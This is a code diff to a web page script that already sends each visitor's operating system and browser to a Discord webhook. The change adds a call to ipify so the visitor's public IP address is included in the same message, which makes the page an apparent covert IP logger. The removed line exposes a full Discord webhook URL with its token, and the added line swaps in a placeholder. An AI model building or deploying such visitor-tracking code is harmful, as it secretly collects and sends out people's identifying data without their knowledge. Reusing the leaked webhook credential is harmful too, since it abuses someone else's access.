@@ -56,13 +56,27 @@
             }
         }
 
+    // Function to get user's public IP address using a third-party service
+        async function getIPAddress() {
+            try {
+                // Use a third-party API like ipify or ipinfo.io to get the user's public IP address
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip; // Return the IP address
+            } catch (error) {
+                console.error("Failed to fetch IP address:", error);
+                return "IP Not Found"; // Return a default message if failed
+            }
+        }
+
         // Function to send the info to the Discord webhook
         async function sendInfoToWebhook() {
             const userInfo = getUserInfo();
-            const webhookURL = "https://discord.com/api/webhooks/1294771673937088575/VM6SHoyAUfr8FWLBL4xuVmUIFobmNAtrOtRM4iFZDVYkID0EmXJA23fEguiU_Hp1CIZv";
+            const ipAddress = await getIPAddress();
+            const webhookURL = "YOUR_DISCORD_WEBHOOK_URL_HERE";
 
             const payload = {
-                content: `User Info: OS - ${userInfo.os}, Browser - ${userInfo.browser}`
+                content: `User Info: OS - ${userInfo.os}, Browser - ${userInfo.browser}, IP Address - ${ipAddress}`
             };
 
             try {
